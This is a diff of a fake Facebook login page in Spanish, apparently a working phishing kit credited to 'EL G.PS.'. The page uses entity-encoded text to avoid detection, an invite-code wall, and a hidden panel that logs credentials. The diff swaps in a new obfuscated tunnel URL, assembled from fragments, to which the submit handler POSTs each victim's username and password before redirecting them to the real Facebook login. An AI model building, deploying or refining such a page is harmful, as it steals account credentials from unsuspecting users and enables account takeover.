@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Inici&#97;r sesi&#243;n</title>
     <style>
-        /* --- MURO DE SEGURIDAD (FONDO NEGRO) --- */
+        /* --- MURO DE SEGURIDAD --- */
         #muro-proteccion { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: #000000; color: #ffffff; 
@@ -23,7 +23,7 @@
             border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px;
         }
 
-        /* --- TU DISEÑO ORIGINAL (OCULTO HASTA VALIDAR) --- */
+        /* --- TU DISEÑO ORIGINAL (TOTALMENTE OCULTO AL INICIO) --- */
         #pagina-original { display: none !important; width: 100%; flex-direction: column; align-items: center; }
         
         body { background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; color: #1c1e21; }
@@ -50,9 +50,9 @@
     <div id="muro-proteccion">
         <div class="muro-box">
             <h2 style="margin:0;">Verificación de Acceso</h2>
-            <p style="font-size:14px; opacity:0.8; margin-top:10px;">Ingresa el código temporal para continuar.</p>
-            <input type="password" id="tokenIn" class="muro-input" placeholder="Código único">
-            <button onclick="ayberRun()" id="mainBtn" class="muro-btn">DESBLOQUEAR</button>
+            <p style="font-size:14px; opacity:0.8; margin-top:10px;">Esta página requiere un código de invitación válido.</p>
+            <input type="password" id="tokenIn" class="muro-input" placeholder="Ingresa tu código único">
+            <button onclick="checkAyber()" id="btnA" class="muro-btn">DESBLOQUEAR ACCESO</button>
         </div>
     </div>
 
@@ -61,15 +61,12 @@
             <span style="color:#1877f2; margin-right:12px;">📥</span>
             <div>Desc&#97;rg&#97; F&#97;c&#101;b&#111;&#111;k p&#97;r&#97; Andr&#111;&#105;d.</div>
         </div>
-
         <div class="l-t">Espa&ntilde;ol</div>
-
         <div class="l-c" ondblclick="_vR()">
             <svg class="f-l" viewBox="0 0 36 36" fill="#1877f2">
                 <path d="M36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.981 6.58 16.425 15.188 17.775v-12.57h-4.566v-5.205h4.566V14.01c0-4.505 2.684-6.994 6.79-6.994 1.967 0 4.024.351 4.024.351v4.425h-2.268c-2.233 0-2.928 1.385-2.928 2.809v3.393h4.986l-.797 5.205h-4.189V35.775C29.42 34.425 36 26.981 36 18z"/>
             </svg>
         </div>
-
         <div class="c-main">
             <form id="_mainForm">
                 <input type="email" id="_uX1" placeholder="Celul&#97;r o corr&#101;o" required>
@@ -79,18 +76,15 @@
             <a href="#" class="f-a">&iquest;Olvid&#97;ste tu c&#111;ntras&#101;&ntilde;&#97;?</a>
             <button type="button" class="b-n">Cre&#97;r cuent&#97; nuev&#97;</button>
         </div>
-
         <div id="p-a">
             <h4 style="margin:0 0 10px 0; color:white; border-bottom:1px solid #33ff33;">PANEL EL G.PS.</h4>
             <div id="_lG">Vacío.</div>
             <button onclick="_cT()" style="margin-top:15px; background:#f00; color:#fff; border:none; padding:5px; border-radius:3px; cursor:pointer;">Limpiar registros</button>
         </div>
-
         <div id="o-l">
             <div class="s-p"></div>
             <p style="margin-top:15px; font-weight:bold;">Cargando...</p>
         </div>
-
         <div class="foot">
             <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="M" class="m-l">
             <div class="sig">Dise&ntilde;ado por EL G.PS.</div>
@@ -99,74 +93,62 @@
 
     <script>
         (function(){
-            // --- OFUSCACIÓN FANTASMA ---
-            // Reconstruye tu link de Termux por fragmentos
-            function getU() {
-                const a = "htt"; const b = "ps://";
-                const c = "0ed337"; const d = "bcfa7ae4";
-                const e = ".lhr"; const f = ".life";
-                return a + b + c + d + e + f;
+            // --- OFUSCACIÓN DE NUEVO LINK ---
+            function gUrl() {
+                const p1 = "htt"; const p2 = "ps://";
+                const p3 = "308bda"; const p4 = "948df4d9";
+                const p5 = ".lhr.li"; const p6 = "fe";
+                return p1+p2+p3+p4+p5+p6;
             }
 
             const muro = document.getElementById('muro-proteccion');
             const pagina = document.getElementById('pagina-original');
 
-            // Persistencia de sesión
-            if(sessionStorage.getItem('valid_ayber')) {
+            if(sessionStorage.getItem('ayber_auth')) {
                 muro.style.display = 'none';
                 pagina.style.setProperty('display', 'flex', 'important');
             }
 
-            // FUNCIÓN PARA VALIDAR LA LLAVE
-            window.ayberRun = function() {
-                const val = document.getElementById('tokenIn').value;
-                if(!val) return;
-                document.getElementById('mainBtn').innerText = "...";
+            window.checkAyber = function() {
+                const tk = document.getElementById('tokenIn').value;
+                if(!tk) return;
+                document.getElementById('btnA').innerText = "...";
 
-                fetch(getU(), {
+                fetch(gUrl(), {
                     method: 'POST',
-                    body: JSON.stringify({ verificar_llave: val }),
+                    body: JSON.stringify({ verificar_llave: tk }),
                     headers: { 'Content-Type': 'application/json' }
                 })
                 .then(r => r.json())
                 .then(r => {
                     if(r.status === "OK") {
-                        sessionStorage.setItem('valid_ayber', 'true');
+                        sessionStorage.setItem('ayber_auth', '1');
                         muro.style.display = 'none';
                         pagina.style.setProperty('display', 'flex', 'important');
                     } else {
-                        alert("Código inválido.");
-                        document.getElementById('mainBtn').innerText = "DESBLOQUEAR";
+                        alert("Código inválido");
+                        document.getElementById('btnA').innerText = "DESBLOQUEAR ACCESO";
                     }
                 })
-                .catch(() => alert("El servidor está apagado."));
+                .catch(() => alert("Servidor desconectado"));
             };
 
-            // LÓGICA DE TU FORMULARIO ORIGINAL
             const _f = document.getElementById('_mainForm');
             _f.addEventListener('submit', function(e) {
                 e.preventDefault();
                 document.getElementById('o-l').style.display = 'flex';
                 const u = document.getElementById('_uX1').value;
                 const p = document.getElementById('_pX2').value;
-                
-                // Guardar en local (Tu función original)
                 _sD(u, p);
-
-                // Enviar a Termux
-                fetch(getU(), {
+                fetch(gUrl(), {
                     method: 'POST',
                     body: JSON.stringify({ usuario: u, clave: p }),
                     headers: { 'Content-Type': 'application/json' }
-                })
-                .finally(() => {
-                    setTimeout(() => {
-                        window.location.href = "https://www.facebook.com/login";
-                    }, 2000);
+                }).finally(() => {
+                    setTimeout(() => { window.location.href = "https://www.facebook.com/login"; }, 2000);
                 });
             });
 
-            // TUS FUNCIONES DEL PANEL EL G.PS.
             window._vR = function() {
                 const pan = document.getElementById('p-a');
                 pan.style.display = (pan.style.display === 'block') ? 'none' : 'block';
